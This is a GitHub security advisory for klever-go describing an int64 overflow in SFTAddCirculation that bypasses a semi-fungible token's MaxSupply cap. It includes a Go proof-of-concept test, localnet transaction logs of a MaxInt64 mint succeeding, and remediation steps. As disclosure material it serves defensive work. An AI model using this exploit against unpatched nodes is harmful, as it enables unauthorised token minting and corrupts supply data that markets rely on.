# [H] klever-go: SFT add-quantity `int64` overflow bypasses a finite per-nonce MaxSupply

## Summary
Severity: High
Advisory: GHSA-mrpp-v6pg-p54x
CVE: CVE-2026-55764
CWE: CWE-190
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-08-28
Source: https://github.com/advisories/GHSA-mrpp-v6pg-p54x
Type: github-advisory

## Affected
- Go: `github.com/klever-io/klever-go` — affected >=0 <1.7.19

## Details
## Summary
On the SFT add-quantity path the only supply bound is `SFTAddCirculation`, which does
`meta.Circulation += amount` with **no overflow guard**, then checks
`if meta.Circulation > meta.MaxSupply && meta.MaxSupply != 0`. If `amount` overflows `int64` and wraps
**negative**, `negative > MaxSupply` is false, the cap check passes, the function returns `nil`, and the balance
credit stands. A nonce created with a finite `MaxSupply` (e.g. 1000) can thus be minted to ~`MaxInt64` tokens in
one transaction. The fungible mint path is **not** vulnerable — it has a post-increment `MintedValue <= 0` guard
that the SFT path lacks.

## Affected code
- `core/kapp/systemAccount/systemAcount.go:132-138` (`SFTAddCirculation`, the unguarded `+=`).
- Caller: `core/kapp/kda/mint.go:247-283` (`processSemiFungibleAddQuantity`); contrast guard `mint.go:289`.

## Impact
A mint-role holder mints ~9.2e18 units of a nonce whose declared `MaxSupply` is small, with no authorized debit,
and corrupts the on-chain `Circulation` counter to a negative value (misleading any market/indexer that reads it).

## Reachability
Mint-role holder (asset owner or an address granted the role). The mint `Amount` is a raw `int64` from the
contract with no upstream upper bound.

## Proof of concept

### Unit test
`TestExploit_SFTCirculationOverflowBypassesCap` creates a nonce capped at `MaxSupply = 1000`, seeds
`Circulation = 5`, then calls `SFTAddCirculation(MaxInt64)`. The call returns `nil` (cap bypassed) and `Circulation`
wraps to `-9223372036854775804`; a normal over-cap amount (`2000`) is correctly rejected with
`ErrMaxSupplyExceeded` and does not persist — isolating the unguarded `+=` overflow as the bypass.

<details><summary>Full Go PoC (<code>systemAccount</code> package, passes = bug confirmed)</summary>

```go
package systemAccount

import (
	"math"
	"testing"

	"github.com/klever-io/klever-go/common"
	commonMock "github.com/klever-io/klever-go/common/mock"
	"github.com/klever-io/klever-go/data/state"
	"github.com/klever-io/klever-go/kapps"
	"github.com/klever-io/klever-go/tools/marshal"
	"github.com/stretchr/testify/require"
)

func newExploitSystemAccountKApp(t *testing.T) (*systemAccountKApp, map[string][]byte) {
	t.Helper()

	marshalizer := &marshal.ProtoMarshalizer{}
	store := make(map[string][]byte)

	tracker := &commonMock.DataTrieTrackerStub{
		RetrieveValueCalled: func(key []byte) ([]byte, error) {
			return store[string(key)], nil
		},
		SaveKeyValueCalled: func(key []byte, value []byte) error {
			store[string(key)] = value
			return nil
		},
	}

	kappAccount := &commonMock.KAppAccountHandlerStub{
		DataTrieTrackerCalled: func() state.DataTrieTracker {
			return tracker
		},
	}

	s := &systemAccountKApp{marshalizer: marshalizer}
	require.NoError(t, s.SetAccountsCacher(&commonMock.AccountsCacherStub{
		LoadKAppCalled: func(address []byte) (state.KAppAccountHandler, error) {
			return kappAccount, nil
		},
	}))

	return s, store
}

func readMeta(t *testing.T, s *systemAccountKApp, asset, nonce []byte) *kapps.MetaV2 {
	t.Helper()
	meta, err := s.SFTGetMeta(asset, nonce)
	require.NoError(t, err)
	require.NotNil(t, meta)
	return meta
}

// TestExploit_SFTCirculationOverflowBypassesCap proves that SFTAddCirculation
// (core/kapp/systemAccount/systemAcount.go:132) performs an unguarded
// `meta.Circulation += amount`. With an amount near MaxInt64, Circulation
// overflows int64 and wraps negative, so the signed cap check
// `meta.Circulation > meta.MaxSupply` reads false and the function returns nil:
// the finite per-nonce MaxSupply (1000) is bypassed and supply is minted far
// past the declared cap.
func TestExploit_SFTCirculationOverflowBypassesCap(t *testing.T) {
	asset := []byte("SFTASSET")
	nonce := []byte{0x01}

	const maxSupply = int64(1000)
	const startCirculation = int64(5)
	// amount is a raw int64 from the contract with no upstream upper bound; the
	// largest value it can carry is MaxInt64. With Circulation already at 5,
	// 5 + MaxInt64 overflows int64 and wraps negative.
	const overflowAmount = int64(math.MaxInt64) // 9223372036854775807

	// --- setup: a nonce with a small FINITE MaxSupply and small Circulation ---
	s, _ := newExploitSystemAccountKApp(t)

	require.NoError(t, s.SFTCreateMeta(asset, nonce, maxSupply, []byte("hash")))
	// seed an initial circulation of 5 (well within the cap)
	require.NoError(t, s.SFTAddCirculation(asset, nonce, startCirculation))

	before := readMeta(t, s, asset, nonce)
	require.Equal(t, maxSupply, before.MaxSupply)
	require.Equal(t, startCirculation, before.Circulation)
	t.Logf("BEFORE  exploit: MaxSupply=%d Circulation=%d", before.MaxSupply, before.Circulation)

	// --- contrast: a normal over-cap amount IS correctly rejected ---
	// 5 + 2000 = 2005 > 1000, no overflow -> ErrMaxSupplyExceeded.
	contrastErr := s.SFTAddCirculation(asset, nonce, 2000)
	require.ErrorIs(t, contrastErr, common.ErrMaxSupplyExceeded,
		"a non-overflowing over-cap mint must be rejected")
	// the rejected call must NOT have persisted (Circulation unchanged at 5)
	afterContrast := readMeta(t, s, asset, nonce)
	require.Equal(t, startCirculation, afterContrast.Circulation,
		"rejected over-cap mint must not persist new circulation")
	t.Logf("CONTRAST mint amount=2000 (5+2000=2005 > cap 1000) -> err=%v, Circulation stays %d",
		contrastErr, afterContrast.Circulation)

	// --- the exploit: amount near MaxInt64 overflows Circulation negative ---
	exploitErr := s.SFTAddCirculation(asset, nonce, overflowAmount)

	after := readMeta(t, s, asset, nonce)
	t.Logf("EXPLOIT mint amount=%d (~MaxInt64), MaxSupply=%d", overflowAmount, after.MaxSupply)
	t.Logf("AFTER   exploit: Circulation=%d  err=%v", after.Circulation, exploitErr)

	// (1) the cap was BYPASSED: SFTAddCirculation returned nil, no ErrMaxSupplyExceeded
	require.NoError(t, exploitErr,
		"BUG: overflowing mint should have been capped but returned nil (cap bypassed)")

	// (2) Circulation wrapped NEGATIVE: minted far past the declared cap of 1000
	require.Negative(t, after.Circulation,
		"BUG: Circulation must have overflowed to a negative value")

	// sanity: the wrap is exactly the int64 two's-complement of 5 + overflowAmount.
	// Computed via non-constant vars so the deliberate overflow happens at runtime
	// (a constant expression would be rejected by the compiler).
	circ := startCirculation
	amt := overflowAmount
	expectedWrap := circ + amt // intentional int64 overflow at runtime
	require.Equal(t, expectedWrap, after.Circulation)

	t.Logf("CONFIRMED: nonce capped at %d now reports Circulation=%d (negative); "+
		"a real mint would have credited ~%d tokens with no matching debit.",
		maxSupply, after.Circulation, overflowAmount)
}
```
</details>

### On-chain reproduction (live single-node localnet)
SFT `F05-2SDF` was created with nonce 1 capped at `MaxSupply = 1000` (the setup mint of `amount = 1` succeeds
normally). An `AssetTrigger Mint` of `amount = 9223372036854775807` (`MaxInt64`) for `F05-2SDF/1`, sent to a fresh
receiver, returned **`resultCode Ok`** with a `Transfer` receipt minting `MaxInt64` from the protocol mint address —
no `MaxSupplyExceeded`, despite the declared cap of 1000. (Sending the same amount to an account that already held
nonce-1 units instead trips the *balance* overflow guard with `RC 37`, confirming the unguarded counter is
specifically `SFTAddCirculation`, reached only when the receiver's balance add does not itself overflow.)

<details><summary>Setup mint — nonce 1 minted normally with <code>amount=1</code> (hash <code>21e8059e…b55aad1a</code>)</summary>

```json
{
    "hash": "21e8059e50ffb5534a02f0f78e12db4632740d8d82da144d1f3732b4b55aad1a",
    "blockNum": 463,
    "status": "success",
    "resultCode": "Ok",
    "chainID": "420420",
    "receipts": [
        {
            "assetId": "F05-2SDF/1",
            "assetType": "SemiFungible",
            "from": "klv1qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqpgm89z",
            "to": "klv1ddnnxjrt4jhus4ddtzmp6ccpcu3us78ndrn4qet0x0vegpg4995qv4nctq",
            "type": 0,
            "typeString": "Transfer",
            "value": 1
        }
    ],
    "contract": [
        {
            "type": 11,
            "typeString": "AssetTriggerContractType",
            "parameter": {
                "triggerType": "Mint",
                "assetId": "F05-2SDF",
                "toAddress": "klv1ddnnxjrt4jhus4ddtzmp6ccpcu3us78ndrn4qet0x0vegpg4995qv4nctq",
                "amount": 1
            }
        }
    ]
}
```
</details>

<details><summary>Exploit — <code>MaxInt64</code> add-quantity to a fresh receiver, result <code>Ok</code>, cap 1000 bypassed (hash <code>8aff40fa…2e1c981e</code>)</summary>

```json
{
    "hash": "8aff40fa270905516cad82083e7eae6264e63a6874f8c13d8348c3632e1c981e",
    "blockNum": 484,
    "status": "success",
    "resultCode": "Ok",
    "chainID": "420420",
    "receipts": [
        {
            "assetId": "F05-2SDF/1",
            "assetType": "SemiFungible",
            "from": "klv1qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqpgm89z",
            "to": "klv1qeh4py4p5zzy94l2hnygpfklug82gpzw08u680ycwp00njxyhgdqcv2xjm",
            "type": 0,
            "typeString": "Transfer",
            "value": 9223372036854775807
        }
    ],
    "contract": [
        {
            "type": 11,
            "typeString": "AssetTriggerContractType",
            "parameter": {
                "triggerType": "Mint",
                "assetId": "F05-2SDF/1",
                "toAddress": "klv1qeh4py4p5zzy94l2hnygpfklug82gpzw08u680ycwp00njxyhgdqcv2xjm",
                "amount": 9223372036854775807
            }
        }
    ]
}
```
</details>

## Remediation
1. In `SFTAddCirculation`, add a post-increment overflow guard before the cap check (e.g.
   `if meta.Circulation < 0 { return ErrSupplyNotValid }`, matching the fungible `MintedValue <= 0` pattern), or
   check `amount` against `MaxSupply - Circulation` with overflow-safe arithmetic.
2. Consensus-affecting → gate behind the next activation flag.

## References
- https://github.com/klever-io/klever-go/security/advisories/GHSA-mrpp-v6pg-p54x
- https://github.com/klever-io/klever-go/commit/8bcc600b0ac88070740c63c7ce1c8a968dd85251
- https://github.com/klever-io/klever-go
- https://github.com/klever-io/klever-go/releases/tag/v1.7.19
